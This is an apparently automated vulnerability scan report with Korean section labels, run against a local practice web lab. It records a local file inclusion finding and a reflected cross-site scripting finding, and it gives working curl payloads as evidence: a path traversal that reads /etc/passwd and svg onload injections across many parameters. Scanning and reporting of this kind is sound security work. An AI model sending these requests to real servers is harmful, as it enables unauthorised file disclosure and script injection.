## 주요 취약점
# HIGH
## Centos Web Panel 0.9.8.480 - Local File Inclusion
- **End-Point**: http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php, http://192.168.64.2:9991/www/FileInclusion/pages/lvl1.php/admin/index.php
- **영향**: Successful exploitation of this vulnerability allows an attacker to read sensitive files on the server.
- **설명**: Centos Web Panel version 0.9.8.480 suffers from local file inclusion vulnerabilities. Other vulnerabilities including cross-site scripting and remote code execution are also known to impact this version.
- **근거**: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' 'http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd'
- **대응**: 
- **조치**: 

# MEDIUM
## Fuzzing Parameters - Cross-Site Scripting
- **End-Point**: http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/, http://192.168.64.2:9991/www/XSS/XSS_level2.php/ 외 2개
- **영향**: N/A
- **설명**: Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.
- **근거**: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.15' 'http://192.168.64.2:9991/www/FileInclusion/pages/lvl2.php/?order_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order_id%27%29%3E&cookie=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cookie%27%29%3E&debug=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-debug%27%29%3E&m=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-m%27%29%3E&dir=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dir%27%29%3E&new_role=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-new_role%27%29%3E&trashed=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trashed%27%29%3E&log=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-log%27%29%3E&excerpt=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-excerpt%27%29%3E&settings-updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings-updated%27%29%3E&plugins=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugins%27%29%3E&modify=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-modify%27%29%3E&pwd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pwd%27%29%3E&file=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file%27%29%3E'
